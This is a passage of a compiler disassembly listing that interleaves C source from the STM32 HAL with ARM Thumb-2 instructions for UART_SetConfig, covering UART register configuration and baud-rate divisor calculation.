  tmpreg = (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling ;
 8005540:	68fb      	ldr	r3, [r7, #12]
 8005542:	689a      	ldr	r2, [r3, #8]
 8005544:	68fb      	ldr	r3, [r7, #12]
 8005546:	691b      	ldr	r3, [r3, #16]
 8005548:	431a      	orrs	r2, r3
 800554a:	68fb      	ldr	r3, [r7, #12]
 800554c:	695b      	ldr	r3, [r3, #20]
 800554e:	431a      	orrs	r2, r3
 8005550:	68fb      	ldr	r3, [r7, #12]
 8005552:	69db      	ldr	r3, [r3, #28]
 8005554:	4313      	orrs	r3, r2
 8005556:	627b      	str	r3, [r7, #36]	; 0x24
  MODIFY_REG(huart->Instance->CR1, USART_CR1_FIELDS, tmpreg);
 8005558:	68fb      	ldr	r3, [r7, #12]
 800555a:	681b      	ldr	r3, [r3, #0]
 800555c:	681a      	ldr	r2, [r3, #0]
 800555e:	4bb4      	ldr	r3, [pc, #720]	; (8005830 <UART_SetConfig+0x300>)
 8005560:	4013      	ands	r3, r2
 8005562:	68fa      	ldr	r2, [r7, #12]
 8005564:	6812      	ldr	r2, [r2, #0]
 8005566:	6a79      	ldr	r1, [r7, #36]	; 0x24
 8005568:	430b      	orrs	r3, r1
 800556a:	6013      	str	r3, [r2, #0]

  /*-------------------------- USART CR2 Configuration -----------------------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according
  * to huart->Init.StopBits value */
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 800556c:	68fb      	ldr	r3, [r7, #12]
 800556e:	681b      	ldr	r3, [r3, #0]
 8005570:	685b      	ldr	r3, [r3, #4]
 8005572:	f423 5140 	bic.w	r1, r3, #12288	; 0x3000
 8005576:	68fb      	ldr	r3, [r7, #12]
 8005578:	68da      	ldr	r2, [r3, #12]
 800557a:	68fb      	ldr	r3, [r7, #12]
 800557c:	681b      	ldr	r3, [r3, #0]
 800557e:	430a      	orrs	r2, r1
 8005580:	605a      	str	r2, [r3, #4]
  /* Configure
  * - UART HardWare Flow Control: set CTSE and RTSE bits according
  *   to huart->Init.HwFlowCtl value
  * - one-bit sampling method versus three samples' majority rule according
  *   to huart->Init.OneBitSampling (not applicable to LPUART) */
  tmpreg = (uint32_t)huart->Init.HwFlowCtl;
 8005582:	68fb      	ldr	r3, [r7, #12]
 8005584:	699b      	ldr	r3, [r3, #24]
 8005586:	627b      	str	r3, [r7, #36]	; 0x24

  if (!(UART_INSTANCE_LOWPOWER(huart)))
 8005588:	68fb      	ldr	r3, [r7, #12]
 800558a:	681b      	ldr	r3, [r3, #0]
 800558c:	4aa9      	ldr	r2, [pc, #676]	; (8005834 <UART_SetConfig+0x304>)
 800558e:	4293      	cmp	r3, r2
 8005590:	d004      	beq.n	800559c <UART_SetConfig+0x6c>
  {
    tmpreg |= huart->Init.OneBitSampling;
 8005592:	68fb      	ldr	r3, [r7, #12]
 8005594:	6a1b      	ldr	r3, [r3, #32]
 8005596:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8005598:	4313      	orrs	r3, r2
 800559a:	627b      	str	r3, [r7, #36]	; 0x24
  }
  MODIFY_REG(huart->Instance->CR3, USART_CR3_FIELDS, tmpreg);
 800559c:	68fb      	ldr	r3, [r7, #12]
 800559e:	681b      	ldr	r3, [r3, #0]
 80055a0:	689b      	ldr	r3, [r3, #8]
 80055a2:	f423 6130 	bic.w	r1, r3, #2816	; 0xb00
 80055a6:	68fb      	ldr	r3, [r7, #12]
 80055a8:	681b      	ldr	r3, [r3, #0]
 80055aa:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 80055ac:	430a      	orrs	r2, r1
 80055ae:	609a      	str	r2, [r3, #8]
  * - UART Clock Prescaler : set PRESCALER according to huart->Init.ClockPrescaler value */
  MODIFY_REG(huart->Instance->PRESC, USART_PRESC_PRESCALER, huart->Init.ClockPrescaler);
#endif /* USART_PRESC_PRESCALER */

  /*-------------------------- USART BRR Configuration -----------------------*/
  UART_GETCLOCKSOURCE(huart, clocksource);
 80055b0:	68fb      	ldr	r3, [r7, #12]
 80055b2:	681b      	ldr	r3, [r3, #0]
 80055b4:	4aa0      	ldr	r2, [pc, #640]	; (8005838 <UART_SetConfig+0x308>)
 80055b6:	4293      	cmp	r3, r2
 80055b8:	d126      	bne.n	8005608 <UART_SetConfig+0xd8>
 80055ba:	4ba0      	ldr	r3, [pc, #640]	; (800583c <UART_SetConfig+0x30c>)
 80055bc:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80055c0:	f003 0303 	and.w	r3, r3, #3
 80055c4:	2b03      	cmp	r3, #3
 80055c6:	d81b      	bhi.n	8005600 <UART_SetConfig+0xd0>
 80055c8:	a201      	add	r2, pc, #4	; (adr r2, 80055d0 <UART_SetConfig+0xa0>)
 80055ca:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80055ce:	bf00      	nop
 80055d0:	080055e1 	.word	0x080055e1
 80055d4:	080055f1 	.word	0x080055f1
 80055d8:	080055e9 	.word	0x080055e9
 80055dc:	080055f9 	.word	0x080055f9
 80055e0:	2301      	movs	r3, #1
 80055e2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055e6:	e080      	b.n	80056ea <UART_SetConfig+0x1ba>
 80055e8:	2302      	movs	r3, #2
 80055ea:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055ee:	e07c      	b.n	80056ea <UART_SetConfig+0x1ba>
 80055f0:	2304      	movs	r3, #4
 80055f2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055f6:	e078      	b.n	80056ea <UART_SetConfig+0x1ba>
 80055f8:	2308      	movs	r3, #8
 80055fa:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055fe:	e074      	b.n	80056ea <UART_SetConfig+0x1ba>
 8005600:	2310      	movs	r3, #16
 8005602:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005606:	e070      	b.n	80056ea <UART_SetConfig+0x1ba>
 8005608:	68fb      	ldr	r3, [r7, #12]
 800560a:	681b      	ldr	r3, [r3, #0]
 800560c:	4a8c      	ldr	r2, [pc, #560]	; (8005840 <UART_SetConfig+0x310>)
 800560e:	4293      	cmp	r3, r2
 8005610:	d138      	bne.n	8005684 <UART_SetConfig+0x154>
 8005612:	4b8a      	ldr	r3, [pc, #552]	; (800583c <UART_SetConfig+0x30c>)
 8005614:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005618:	f003 030c 	and.w	r3, r3, #12
 800561c:	2b0c      	cmp	r3, #12
 800561e:	d82d      	bhi.n	800567c <UART_SetConfig+0x14c>
 8005620:	a201      	add	r2, pc, #4	; (adr r2, 8005628 <UART_SetConfig+0xf8>)
 8005622:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005626:	bf00      	nop
 8005628:	0800565d 	.word	0x0800565d
 800562c:	0800567d 	.word	0x0800567d
 8005630:	0800567d 	.word	0x0800567d
 8005634:	0800567d 	.word	0x0800567d
 8005638:	0800566d 	.word	0x0800566d
 800563c:	0800567d 	.word	0x0800567d
 8005640:	0800567d 	.word	0x0800567d
 8005644:	0800567d 	.word	0x0800567d
 8005648:	08005665 	.word	0x08005665
 800564c:	0800567d 	.word	0x0800567d
 8005650:	0800567d 	.word	0x0800567d
 8005654:	0800567d 	.word	0x0800567d
 8005658:	08005675 	.word	0x08005675
 800565c:	2300      	movs	r3, #0
 800565e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005662:	e042      	b.n	80056ea <UART_SetConfig+0x1ba>
 8005664:	2302      	movs	r3, #2
 8005666:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800566a:	e03e      	b.n	80056ea <UART_SetConfig+0x1ba>
 800566c:	2304      	movs	r3, #4
 800566e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005672:	e03a      	b.n	80056ea <UART_SetConfig+0x1ba>
 8005674:	2308      	movs	r3, #8
 8005676:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800567a:	e036      	b.n	80056ea <UART_SetConfig+0x1ba>
 800567c:	2310      	movs	r3, #16
 800567e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005682:	e032      	b.n	80056ea <UART_SetConfig+0x1ba>
 8005684:	68fb      	ldr	r3, [r7, #12]
 8005686:	681b      	ldr	r3, [r3, #0]
 8005688:	4a6a      	ldr	r2, [pc, #424]	; (8005834 <UART_SetConfig+0x304>)
 800568a:	4293      	cmp	r3, r2
 800568c:	d12a      	bne.n	80056e4 <UART_SetConfig+0x1b4>
 800568e:	4b6b      	ldr	r3, [pc, #428]	; (800583c <UART_SetConfig+0x30c>)
 8005690:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005694:	f403 6340 	and.w	r3, r3, #3072	; 0xc00
 8005698:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 800569c:	d01a      	beq.n	80056d4 <UART_SetConfig+0x1a4>
 800569e:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 80056a2:	d81b      	bhi.n	80056dc <UART_SetConfig+0x1ac>
 80056a4:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 80056a8:	d00c      	beq.n	80056c4 <UART_SetConfig+0x194>
 80056aa:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 80056ae:	d815      	bhi.n	80056dc <UART_SetConfig+0x1ac>
 80056b0:	2b00      	cmp	r3, #0
 80056b2:	d003      	beq.n	80056bc <UART_SetConfig+0x18c>
 80056b4:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 80056b8:	d008      	beq.n	80056cc <UART_SetConfig+0x19c>
 80056ba:	e00f      	b.n	80056dc <UART_SetConfig+0x1ac>
 80056bc:	2300      	movs	r3, #0
 80056be:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056c2:	e012      	b.n	80056ea <UART_SetConfig+0x1ba>
 80056c4:	2302      	movs	r3, #2
 80056c6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056ca:	e00e      	b.n	80056ea <UART_SetConfig+0x1ba>
 80056cc:	2304      	movs	r3, #4
 80056ce:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056d2:	e00a      	b.n	80056ea <UART_SetConfig+0x1ba>
 80056d4:	2308      	movs	r3, #8
 80056d6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056da:	e006      	b.n	80056ea <UART_SetConfig+0x1ba>
 80056dc:	2310      	movs	r3, #16
 80056de:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056e2:	e002      	b.n	80056ea <UART_SetConfig+0x1ba>
 80056e4:	2310      	movs	r3, #16
 80056e6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23

  /* Check LPUART instance */
  if (UART_INSTANCE_LOWPOWER(huart))
 80056ea:	68fb      	ldr	r3, [r7, #12]
 80056ec:	681b      	ldr	r3, [r3, #0]
 80056ee:	4a51      	ldr	r2, [pc, #324]	; (8005834 <UART_SetConfig+0x304>)
 80056f0:	4293      	cmp	r3, r2
 80056f2:	d17a      	bne.n	80057ea <UART_SetConfig+0x2ba>
  {
    /* Retrieve frequency clock */
    switch (clocksource)
 80056f4:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80056f8:	2b08      	cmp	r3, #8
 80056fa:	d824      	bhi.n	8005746 <UART_SetConfig+0x216>
 80056fc:	a201      	add	r2, pc, #4	; (adr r2, 8005704 <UART_SetConfig+0x1d4>)
 80056fe:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005702:	bf00      	nop
 8005704:	08005729 	.word	0x08005729
 8005708:	08005747 	.word	0x08005747
 800570c:	08005731 	.word	0x08005731
 8005710:	08005747 	.word	0x08005747
 8005714:	08005737 	.word	0x08005737
 8005718:	08005747 	.word	0x08005747
 800571c:	08005747 	.word	0x08005747
 8005720:	08005747 	.word	0x08005747
 8005724:	0800573f 	.word	0x0800573f
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005728:	f7fe fe6c 	bl	8004404 <HAL_RCC_GetPCLK1Freq>
 800572c:	61f8      	str	r0, [r7, #28]
        break;
 800572e:	e010      	b.n	8005752 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005730:	4b44      	ldr	r3, [pc, #272]	; (8005844 <UART_SetConfig+0x314>)
 8005732:	61fb      	str	r3, [r7, #28]
        break;
 8005734:	e00d      	b.n	8005752 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005736:	f7fe fdcd 	bl	80042d4 <HAL_RCC_GetSysClockFreq>
 800573a:	61f8      	str	r0, [r7, #28]
        break;
 800573c:	e009      	b.n	8005752 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 800573e:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005742:	61fb      	str	r3, [r7, #28]
        break;
 8005744:	e005      	b.n	8005752 <UART_SetConfig+0x222>
      default:
        pclk = 0U;
 8005746:	2300      	movs	r3, #0
 8005748:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 800574a:	2301      	movs	r3, #1
 800574c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005750:	bf00      	nop
    }

    /* If proper clock source reported */
    if (pclk != 0U)
 8005752:	69fb      	ldr	r3, [r7, #28]
 8005754:	2b00      	cmp	r3, #0
 8005756:	f000 8107 	beq.w	8005968 <UART_SetConfig+0x438>
      } /* if ( (lpuart_ker_ck_pres < (3 * huart->Init.BaudRate) ) ||
                (lpuart_ker_ck_pres > (4096 * huart->Init.BaudRate) )) */
#else
      /* No Prescaler applicable */
      /* Ensure that Frequency clock is in the range [3 * baudrate, 4096 * baudrate] */
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 800575a:	68fb      	ldr	r3, [r7, #12]
 800575c:	685a      	ldr	r2, [r3, #4]
 800575e:	4613      	mov	r3, r2
 8005760:	005b      	lsls	r3, r3, #1
 8005762:	4413      	add	r3, r2
 8005764:	69fa      	ldr	r2, [r7, #28]
 8005766:	429a      	cmp	r2, r3
 8005768:	d305      	bcc.n	8005776 <UART_SetConfig+0x246>
          (pclk > (4096U * huart->Init.BaudRate)))
 800576a:	68fb      	ldr	r3, [r7, #12]
 800576c:	685b      	ldr	r3, [r3, #4]
 800576e:	031b      	lsls	r3, r3, #12
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 8005770:	69fa      	ldr	r2, [r7, #28]
 8005772:	429a      	cmp	r2, r3
 8005774:	d903      	bls.n	800577e <UART_SetConfig+0x24e>
      {
        ret = HAL_ERROR;
 8005776:	2301      	movs	r3, #1
 8005778:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 800577c:	e0f4      	b.n	8005968 <UART_SetConfig+0x438>
      }
      else
      {
        usartdiv = (uint32_t)(UART_DIV_LPUART(pclk, huart->Init.BaudRate));
 800577e:	69fb      	ldr	r3, [r7, #28]
 8005780:	2200      	movs	r2, #0
 8005782:	461c      	mov	r4, r3
 8005784:	4615      	mov	r5, r2
 8005786:	f04f 0200 	mov.w	r2, #0
 800578a:	f04f 0300 	mov.w	r3, #0
 800578e:	022b      	lsls	r3, r5, #8
 8005790:	ea43 6314 	orr.w	r3, r3, r4, lsr #24
 8005794:	0222      	lsls	r2, r4, #8
 8005796:	68f9      	ldr	r1, [r7, #12]
 8005798:	6849      	ldr	r1, [r1, #4]
 800579a:	0849      	lsrs	r1, r1, #1
 800579c:	2000      	movs	r0, #0
 800579e:	4688      	mov	r8, r1
 80057a0:	4681      	mov	r9, r0
 80057a2:	eb12 0a08 	adds.w	sl, r2, r8
 80057a6:	eb43 0b09 	adc.w	fp, r3, r9
 80057aa:	68fb      	ldr	r3, [r7, #12]
 80057ac:	685b      	ldr	r3, [r3, #4]
 80057ae:	2200      	movs	r2, #0
 80057b0:	603b      	str	r3, [r7, #0]
 80057b2:	607a      	str	r2, [r7, #4]
 80057b4:	e9d7 2300 	ldrd	r2, r3, [r7]
 80057b8:	4650      	mov	r0, sl
 80057ba:	4659      	mov	r1, fp
 80057bc:	f7fa fd0e 	bl	80001dc <__aeabi_uldivmod>
 80057c0:	4602      	mov	r2, r0
 80057c2:	460b      	mov	r3, r1
 80057c4:	4613      	mov	r3, r2
 80057c6:	61bb      	str	r3, [r7, #24]
        if ((usartdiv >= LPUART_BRR_MIN) && (usartdiv <= LPUART_BRR_MAX))
 80057c8:	69bb      	ldr	r3, [r7, #24]
 80057ca:	f5b3 7f40 	cmp.w	r3, #768	; 0x300
 80057ce:	d308      	bcc.n	80057e2 <UART_SetConfig+0x2b2>
 80057d0:	69bb      	ldr	r3, [r7, #24]
 80057d2:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 80057d6:	d204      	bcs.n	80057e2 <UART_SetConfig+0x2b2>
        {
          huart->Instance->BRR = usartdiv;
 80057d8:	68fb      	ldr	r3, [r7, #12]
 80057da:	681b      	ldr	r3, [r3, #0]
 80057dc:	69ba      	ldr	r2, [r7, #24]
 80057de:	60da      	str	r2, [r3, #12]
 80057e0:	e0c2      	b.n	8005968 <UART_SetConfig+0x438>
        }
        else
        {
          ret = HAL_ERROR;
 80057e2:	2301      	movs	r3, #1
 80057e4:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80057e8:	e0be      	b.n	8005968 <UART_SetConfig+0x438>
      } /* if ( (pclk < (3 * huart->Init.BaudRate) ) || (pclk > (4096 * huart->Init.BaudRate) )) */
#endif /* USART_PRESC_PRESCALER */
    } /* if (pclk != 0) */
  }
  /* Check UART Over Sampling to set Baud Rate Register */
  else if (huart->Init.OverSampling == UART_OVERSAMPLING_8)
 80057ea:	68fb      	ldr	r3, [r7, #12]
 80057ec:	69db      	ldr	r3, [r3, #28]
 80057ee:	f5b3 4f00 	cmp.w	r3, #32768	; 0x8000
 80057f2:	d16a      	bne.n	80058ca <UART_SetConfig+0x39a>
  {
    switch (clocksource)
 80057f4:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80057f8:	2b08      	cmp	r3, #8
 80057fa:	d834      	bhi.n	8005866 <UART_SetConfig+0x336>
 80057fc:	a201      	add	r2, pc, #4	; (adr r2, 8005804 <UART_SetConfig+0x2d4>)
 80057fe:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005802:	bf00      	nop
 8005804:	08005829 	.word	0x08005829
 8005808:	08005849 	.word	0x08005849
 800580c:	08005851 	.word	0x08005851
 8005810:	08005867 	.word	0x08005867
 8005814:	08005857 	.word	0x08005857
 8005818:	08005867 	.word	0x08005867
 800581c:	08005867 	.word	0x08005867
 8005820:	08005867 	.word	0x08005867
 8005824:	0800585f 	.word	0x0800585f
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005828:	f7fe fdec 	bl	8004404 <HAL_RCC_GetPCLK1Freq>
 800582c:	61f8      	str	r0, [r7, #28]
        break;
 800582e:	e020      	b.n	8005872 <UART_SetConfig+0x342>
 8005830:	efff69f3 	.word	0xefff69f3
 8005834:	40008000 	.word	0x40008000
 8005838:	40013800 	.word	0x40013800
 800583c:	40021000 	.word	0x40021000
 8005840:	40004400 	.word	0x40004400
 8005844:	00f42400 	.word	0x00f42400
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005848:	f7fe fdf2 	bl	8004430 <HAL_RCC_GetPCLK2Freq>
 800584c:	61f8      	str	r0, [r7, #28]
        break;
 800584e:	e010      	b.n	8005872 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005850:	4b4c      	ldr	r3, [pc, #304]	; (8005984 <UART_SetConfig+0x454>)
 8005852:	61fb      	str	r3, [r7, #28]
        break;
 8005854:	e00d      	b.n	8005872 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005856:	f7fe fd3d 	bl	80042d4 <HAL_RCC_GetSysClockFreq>
 800585a:	61f8      	str	r0, [r7, #28]
        break;
 800585c:	e009      	b.n	8005872 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 800585e:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005862:	61fb      	str	r3, [r7, #28]
        break;
 8005864:	e005      	b.n	8005872 <UART_SetConfig+0x342>
      default:
        pclk = 0U;
 8005866:	2300      	movs	r3, #0
 8005868:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 800586a:	2301      	movs	r3, #1
 800586c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005870:	bf00      	nop
    }

    /* USARTDIV must be greater than or equal to 0d16 */
    if (pclk != 0U)
 8005872:	69fb      	ldr	r3, [r7, #28]
 8005874:	2b00      	cmp	r3, #0
 8005876:	d077      	beq.n	8005968 <UART_SetConfig+0x438>
    {
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate));
 8005878:	69fb      	ldr	r3, [r7, #28]
 800587a:	005a      	lsls	r2, r3, #1
 800587c:	68fb      	ldr	r3, [r7, #12]
 800587e:	685b      	ldr	r3, [r3, #4]
 8005880:	085b      	lsrs	r3, r3, #1
 8005882:	441a      	add	r2, r3
 8005884:	68fb      	ldr	r3, [r7, #12]
 8005886:	685b      	ldr	r3, [r3, #4]
 8005888:	fbb2 f3f3 	udiv	r3, r2, r3
 800588c:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 800588e:	69bb      	ldr	r3, [r7, #24]
 8005890:	2b0f      	cmp	r3, #15
 8005892:	d916      	bls.n	80058c2 <UART_SetConfig+0x392>
 8005894:	69bb      	ldr	r3, [r7, #24]
 8005896:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 800589a:	d212      	bcs.n	80058c2 <UART_SetConfig+0x392>
      {
        brrtemp = (uint16_t)(usartdiv & 0xFFF0U);
 800589c:	69bb      	ldr	r3, [r7, #24]
 800589e:	b29b      	uxth	r3, r3
 80058a0:	f023 030f 	bic.w	r3, r3, #15
 80058a4:	82fb      	strh	r3, [r7, #22]
        brrtemp |= (uint16_t)((usartdiv & (uint16_t)0x000FU) >> 1U);
 80058a6:	69bb      	ldr	r3, [r7, #24]
 80058a8:	085b      	lsrs	r3, r3, #1
 80058aa:	b29b      	uxth	r3, r3
 80058ac:	f003 0307 	and.w	r3, r3, #7
 80058b0:	b29a      	uxth	r2, r3
 80058b2:	8afb      	ldrh	r3, [r7, #22]
 80058b4:	4313      	orrs	r3, r2
 80058b6:	82fb      	strh	r3, [r7, #22]
        huart->Instance->BRR = brrtemp;
 80058b8:	68fb      	ldr	r3, [r7, #12]
 80058ba:	681b      	ldr	r3, [r3, #0]
 80058bc:	8afa      	ldrh	r2, [r7, #22]
 80058be:	60da      	str	r2, [r3, #12]
 80058c0:	e052      	b.n	8005968 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 80058c2:	2301      	movs	r3, #1
 80058c4:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80058c8:	e04e      	b.n	8005968 <UART_SetConfig+0x438>
      }
    }
  }
  else
  {
    switch (clocksource)
 80058ca:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80058ce:	2b08      	cmp	r3, #8
 80058d0:	d827      	bhi.n	8005922 <UART_SetConfig+0x3f2>
 80058d2:	a201      	add	r2, pc, #4	; (adr r2, 80058d8 <UART_SetConfig+0x3a8>)
 80058d4:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80058d8:	080058fd 	.word	0x080058fd
 80058dc:	08005905 	.word	0x08005905
 80058e0:	0800590d 	.word	0x0800590d
 80058e4:	08005923 	.word	0x08005923
 80058e8:	08005913 	.word	0x08005913
 80058ec:	08005923 	.word	0x08005923
 80058f0:	08005923 	.word	0x08005923
 80058f4:	08005923 	.word	0x08005923
 80058f8:	0800591b 	.word	0x0800591b
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 80058fc:	f7fe fd82 	bl	8004404 <HAL_RCC_GetPCLK1Freq>
 8005900:	61f8      	str	r0, [r7, #28]
        break;
 8005902:	e014      	b.n	800592e <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005904:	f7fe fd94 	bl	8004430 <HAL_RCC_GetPCLK2Freq>
 8005908:	61f8      	str	r0, [r7, #28]
        break;
 800590a:	e010      	b.n	800592e <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 800590c:	4b1d      	ldr	r3, [pc, #116]	; (8005984 <UART_SetConfig+0x454>)
 800590e:	61fb      	str	r3, [r7, #28]
        break;
 8005910:	e00d      	b.n	800592e <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005912:	f7fe fcdf 	bl	80042d4 <HAL_RCC_GetSysClockFreq>
 8005916:	61f8      	str	r0, [r7, #28]
        break;
 8005918:	e009      	b.n	800592e <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 800591a:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 800591e:	61fb      	str	r3, [r7, #28]
        break;
 8005920:	e005      	b.n	800592e <UART_SetConfig+0x3fe>
      default:
        pclk = 0U;
 8005922:	2300      	movs	r3, #0
 8005924:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005926:	2301      	movs	r3, #1
 8005928:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 800592c:	bf00      	nop
    }

    if (pclk != 0U)
 800592e:	69fb      	ldr	r3, [r7, #28]
 8005930:	2b00      	cmp	r3, #0
 8005932:	d019      	beq.n	8005968 <UART_SetConfig+0x438>
    {
      /* USARTDIV must be greater than or equal to 0d16 */
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate));
 8005934:	68fb      	ldr	r3, [r7, #12]
 8005936:	685b      	ldr	r3, [r3, #4]
 8005938:	085a      	lsrs	r2, r3, #1
 800593a:	69fb      	ldr	r3, [r7, #28]
 800593c:	441a      	add	r2, r3
 800593e:	68fb      	ldr	r3, [r7, #12]
 8005940:	685b      	ldr	r3, [r3, #4]
 8005942:	fbb2 f3f3 	udiv	r3, r2, r3
 8005946:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005948:	69bb      	ldr	r3, [r7, #24]
 800594a:	2b0f      	cmp	r3, #15
 800594c:	d909      	bls.n	8005962 <UART_SetConfig+0x432>
 800594e:	69bb      	ldr	r3, [r7, #24]
 8005950:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005954:	d205      	bcs.n	8005962 <UART_SetConfig+0x432>
      {
        huart->Instance->BRR = (uint16_t)usartdiv;
 8005956:	69bb      	ldr	r3, [r7, #24]
 8005958:	b29a      	uxth	r2, r3
 800595a:	68fb      	ldr	r3, [r7, #12]
 800595c:	681b      	ldr	r3, [r3, #0]
 800595e:	60da      	str	r2, [r3, #12]
 8005960:	e002      	b.n	8005968 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005962:	2301      	movs	r3, #1
 8005964:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  huart->NbTxDataToProcess = 1;
  huart->NbRxDataToProcess = 1;
#endif /* USART_CR1_FIFOEN */

  /* Clear ISR function pointers */
  huart->RxISR = NULL;
 8005968:	68fb      	ldr	r3, [r7, #12]
 800596a:	2200      	movs	r2, #0
 800596c:	669a      	str	r2, [r3, #104]	; 0x68
  huart->TxISR = NULL;
 800596e:	68fb      	ldr	r3, [r7, #12]
 8005970:	2200      	movs	r2, #0
 8005972:	66da      	str	r2, [r3, #108]	; 0x6c

  return ret;
 8005974:	f897 3022 	ldrb.w	r3, [r7, #34]	; 0x22
}
 8005978:	4618      	mov	r0, r3
 800597a:	3728      	adds	r7, #40	; 0x28
 800597c:	46bd      	mov	sp, r7
 800597e:	e8bd 8fb0 	ldmia.w	sp!, {r4, r5, r7, r8, r9, sl, fp, pc}
 8005982:	bf00      	nop
 8005984:	00f42400 	.word	0x00f42400

08005988 <UART_AdvFeatureConfig>:
  * @brief Configure the UART peripheral advanced features.
  * @param huart UART handle.
  * @retval None
  */
void UART_AdvFeatureConfig(UART_HandleTypeDef *huart)
{
 8005988:	b480      	push	{r7}
 800598a:	b083      	sub	sp, #12
 800598c:	af00      	add	r7, sp, #0
 800598e:	6078      	str	r0, [r7, #4]
  /* Check whether the set of advanced features to configure is properly set */
  assert_param(IS_UART_ADVFEATURE_INIT(huart->AdvancedInit.AdvFeatureInit));

  /* if required, configure RX/TX pins swap */
